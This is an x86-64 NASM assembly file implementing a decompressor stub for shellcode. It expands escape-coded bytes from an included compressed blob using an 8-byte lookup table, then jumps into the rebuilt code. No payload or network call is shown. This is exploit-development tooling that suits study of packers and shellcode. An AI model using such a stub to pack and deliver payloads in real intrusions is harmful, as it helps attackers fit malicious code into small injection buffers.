BITS 64
default rel
global main
	
%include "defines.asm"

	section .text

main:	xor edi, edi
	mov esi, edi
	mov edx, edi
	
	;; final length of shellcode
        mov di, orig_len
        mov si, short_len
	
base:	lea rbx, [$ + code - base]
	mov ecx, esi		; get count for total bytes to process
	add rsi, rbx		; put source register at end of code
	add rdi, rbx		; end of final 
	sub rbx, 8 * table_len	; back up for the table
loop:   dec rsi			; move window
	dec rdi			; ...
	mov al, [rsi]		; get a byte
	cmp al, 0x36		; check for escape char
	je .escape		; ...
	mov [rdi], al		; store the byte
	loop loop		; next one
	xor ecx, ecx
	jmp code
	
.escape:
	mov dl, [rsi - 1]	; get next byte
	and dl, dl		; test it
	jz .literal		; it's an actual 0x36 byte
.lp2:   mov rax, [rbx + rdx * 8] ; get expansion
	sub rdi, 7		; move destination window
	mov [rdi], rax		; write the expansion
	dec rsi			; move source window
	dec ecx			; used up another char
	loop loop
	xor ecx, ecx
	jmp code
	
.literal:
	mov al, 0x36		; get literal char
	mov [rdi], al		; store it
	dec rsi			; ..
	loop loop
	jmp code

%include "compressed.asm"
